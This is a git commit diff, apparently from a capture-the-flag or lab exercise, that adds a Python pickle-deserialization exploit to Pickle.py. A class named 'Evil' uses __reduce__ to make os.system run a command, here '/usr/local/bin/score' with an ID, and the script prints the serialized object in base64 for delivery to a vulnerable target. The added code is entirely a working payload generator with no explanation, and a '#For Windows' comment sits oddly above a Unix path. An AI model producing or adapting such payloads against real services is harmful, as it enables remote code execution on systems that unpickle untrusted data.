4fb5e7bbc83728c5417c301fb6e4142fe60a4b02
QuanFPT <93258260+QuanFPT@users.noreply.github.com>
2025-04-23 09:39:44 +0700

    Update Pickle.py

--- Pickle.py
+++ Pickle.py
@@ -1,3 +1,15 @@
+#For Windows
+import base64
+import pickle, os
+
+class Evil(object):
+    def __reduce__(self):
+        return (os.system,("/usr/local/bin/score 35516971-8b06-4d5b-bbbe-2d825ed1ee0a",))
+
+e = Evil()
+print(base64.b64encode(pickle.dumps(e,2)))
+
+# For Linux
 import base64
 import pickle, os
 
